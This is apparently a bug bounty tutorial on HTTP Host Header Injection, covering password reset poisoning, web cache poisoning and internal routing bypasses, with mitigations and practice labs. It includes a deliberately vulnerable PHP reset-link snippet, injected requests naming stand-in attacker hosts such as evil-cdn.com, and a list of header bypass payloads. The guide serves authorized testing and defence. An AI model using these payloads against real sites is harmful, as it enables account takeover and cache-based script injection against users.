# 📁 Host Header Injection — Security Testing Guide

*Contributed by Cyber_Spy.404 | Educational Bug Bounty Series*

> **Scope and ethics:** Host Header Injection can affect intermediate caching servers and automated email delivery workflows. Test strictly against assets in your authorized program. **Never poison cache keys for production users or trigger password reset emails targeting third-party email addresses.** Use only controlled test accounts and harmless verification domains.

---

## 📌 Executive Summary

HTTP Host Header Injection occurs when a web application or intermediate reverse proxy implicitly trusts the client-supplied HTTP `Host` header (or related proxy headers like `X-Forwarded-Host`) to generate absolute links, construct password reset URLs, configure email templates, or route internal requests without validating the header against an allowed whitelist of domain names.

### 🌐 Architectural Root Cause
In many web frameworks (such as Django, Express, PHP, Laravel, Rails), developers generate URLs dynamically using the incoming request object:
```php
// ❌ VULNERABLE: Dynamically building password reset URL using client-supplied Host
$reset_link = "https://" . $_SERVER['HTTP_HOST'] . "/reset-password?token=" . $token;
mail($user['email'], "Password Reset Request", $reset_link);
```
If an attacker modifies the `Host` header to `attacker-domain.com`, the generated email sends the victim's secret reset token directly to the attacker's infrastructure.

```
+-----------------------------------------------------------------------------------+
|                        Password Reset Poisoning Flow                              |
+-----------------------------------------------------------------------------------+
       |
  Attacker sends:
  POST /forgot-password
  Host: evil-attacker.com
  Email: victim@example.com
       |
       v
+------------------------------------+
| Application Server                 |
| Generates token: XYZ123            |
| Constructs email using Host header |
+------------------+-----------------+
                   |
                   v
  Dispatches Email to Victim:
  "Click here to reset your password:
   https://evil-attacker.com/reset?token=XYZ123"
                   |
                   v
+------------------------------------+
| Victim clicks link                 |
| Token is leaked in Referer/Server  |
| log to evil-attacker.com! ❌       |
+------------------------------------+
```

---

## 🔍 Core Attack Vectors & Testing Methodology

### 1. Password Reset Poisoning
This is the highest-impact realization of Host Header Injection, leading directly to **Account Takeover (ATO)**.

#### Testing Procedure:
1. Navigate to the password reset flow using your **own controlled test email** (`test-user@your-domain.com`).
2. Intercept the password reset request in Burp Suite / Caido.
3. Modify the `Host` header to a benign canary domain you control (e.g., `canary.your-domain.com` or Burp Collaborator).
4. Send the request and check the password reset email received in your inbox.
5. **Vulnerable Indicator:** The reset link inside the email points to `https://canary.your-domain.com/reset?token=...`.
6. **Secure Indicator:** The application rejects the request with `400 Bad Request`, or the email contains the official production domain `https://example.com/reset?token=...`.

---

### 2. Web Cache Poisoning via Unkeyed Host Headers
When an intermediate caching layer (CDN, Varnish, Cloudflare) caches responses based only on the request path and query string, but the origin server uses the `Host` or `X-Forwarded-Host` header to load frontend assets or scripts:

#### Injected Request:
```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: evil-cdn.com
```

#### Cached Response:
```http
HTTP/1.1 200 OK
X-Cache: HIT
Content-Type: text/html

<html>
  <script src="https://evil-cdn.com/static/bundle.js"></script>
</html>
```
If this response is cached and served to subsequent users, the attacker achieves universal stored XSS against all site visitors.

---

### 3. Virtual Host & Internal Routing Bypasses
Many reverse proxies and API gateways host multiple virtual hosts on the same physical IP (e.g., public frontend vs internal admin dashboard):
- Try substituting internal hostnames in the `Host` header:
  - `Host: localhost`
  - `Host: 127.0.0.1`
  - `Host: admin.internal`
  - `Host: staging.internal.example.com`

---

## 💡 High-Value Bug Bounty Tips & Header Variations

When standard `Host` modification triggers a `400 Bad Request` or CDN block, test these header bypass variations:

### 1. Alternative Proxy Headers
Modern proxies often forward custom forwarding headers:
```http
GET /reset-password HTTP/1.1
Host: example.com
X-Forwarded-Host: canary.example.com
X-Host: canary.example.com
X-Forwarded-Server: canary.example.com
Forwarded: host=canary.example.com;proto=https
```

### 2. Duplicate Host Headers
Some proxy/web server combinations handle duplicate headers inconsistently (e.g., front-end proxy reads the first, backend reads the second):
```http
POST /forgot-password HTTP/1.1
Host: example.com
Host: canary.example.com
Content-Type: application/json
```

### 3. Port Injection
Applications that sanitize domain names often fail to validate the port suffix:
```http
POST /forgot-password HTTP/1.1
Host: example.com:canary.example.com
Host: example.com:@canary.example.com
Host: example.com:8080
```

### 4. Malformed Host Syntax
- Indented Host header (RFC 7230 line folding):
  ```http
  GET / HTTP/1.1
   Host: canary.example.com
  ```
- Absolute URI with mismatched Host:
  ```http
  GET https://example.com/index.html HTTP/1.1
  Host: canary.example.com
  ```

---

## 🛠️ Safe Educational Verification Template

### Safe HTTP Request Example
```http
POST /api/v1/auth/forgot-password HTTP/1.1
Host: example.com
X-Forwarded-Host: [CANARY_CONTROLLED_DOMAIN]
Content-Type: application/json

{
  "email": "[OWN_CONTROLLED_TEST_EMAIL@example.com]"
}
```

### Verification in Email Evidence
Check the incoming email headers and link URL:
```text
Subject: Reset your password
From: no-reply@example.com
To: [OWN_CONTROLLED_TEST_EMAIL@example.com]

We received a request to reset your password.
Please click the link below:
https://[CANARY_CONTROLLED_DOMAIN]/auth/reset?code=TOKEN_VALUE
```

---

## 🛡️ Mitigation & Remediation Guidelines

### 1. Use Hardcoded / Configured Base URLs
Never construct absolute URLs from incoming client headers. Define the canonical base domain in server configuration:
```python
# Django settings.py (SECURE)
SITE_URL = 'https://www.example.com'

# In password reset view:
reset_url = f"{settings.SITE_URL}/reset-password?token={token}"
```

### 2. Enforce Strict Allowed Hosts Whitelist
Configure web frameworks and servers to reject unrecognized hostnames immediately:
```python
# Django settings.py
ALLOWED_HOSTS = ['example.com', 'www.example.com']
```
In Nginx:
```nginx
# Default server block: Reject unknown host headers
server {
    listen 80 default_server;
    listen 443 ssl default_server;
    server_name _;
    return 444; # Drop connection
}

# Legitimate virtual host block
server {
    listen 80;
    listen 443 ssl;
    server_name example.com www.example.com;
    ...
}
```

### 3. Ignore Untrusted Proxy Headers
Ensure your reverse proxy (Cloudflare, AWS ALB, Nginx) strips or overwrites untrusted incoming headers (`X-Forwarded-Host`, `X-Forwarded-Server`) before passing requests to backend application servers.

---

## 📊 CVSS 3.1 Severity Reference

- **Password Reset Poisoning leading to Full ATO:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` (Score: **8.8 - High**)
- **Web Cache Poisoning with Client-Side Code Execution:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` (Score: **9.0 - Critical**)
- **Internal Routing Bypass / Admin Access:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` (Score: **8.2 - High**)

---

## ✅ Bug Bounty Triage Checklist

- [ ] Target domain is confirmed within scope.
- [ ] Used strictly your own controlled test email account.
- [ ] Tested both standard `Host` modification and proxy headers (`X-Forwarded-Host`).
- [ ] Verified that the test email actually arrived with poisoned URL.
- [ ] Redacted all test email addresses and sensitive token parameters in report.
- [ ] Did not poison public cache entries serving real end-users.
---

## 🧪 Hands-On Practice Labs & Real-World Challenges

Practice password reset poisoning, web cache poisoning, and routing SSRF:

| Platform | Lab / Challenge Name | Difficulty | Key Focus Area |
| :--- | :--- | :--- | :--- |
| **PortSwigger Academy** | [Basic password reset poisoning](https://portswigger.net/web-security/host-header/lab-host-header-basic-password-reset-poisoning) | Practitioner | Poisoning reset link domain via manipulated `Host` header |
| **PortSwigger Academy** | [Host header authentication bypass](https://portswigger.net/web-security/host-header/lab-host-header-authentication-bypass) | Practitioner | Accessing restricted `/admin` path by spoofing internal host |
| **PortSwigger Academy** | [Routing-based SSRF via Host header](https://portswigger.net/web-security/host-header/lab-host-header-routing-based-ssrf) | Practitioner | Routing reverse proxy requests to internal cloud metadata IP |
| **PortSwigger Academy** | [SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/lab-host-header-ssrf-via-flawed-request-parsing) | Practitioner | Supplying absolute URLs in request line to trigger SSRF |
| **Hack The Box** | [HTB Academy: Server-Side Attacks](https://academy.hackthebox.com/) | Medium | Host header tampering, cache poisoning, and internal proxy pivoting |
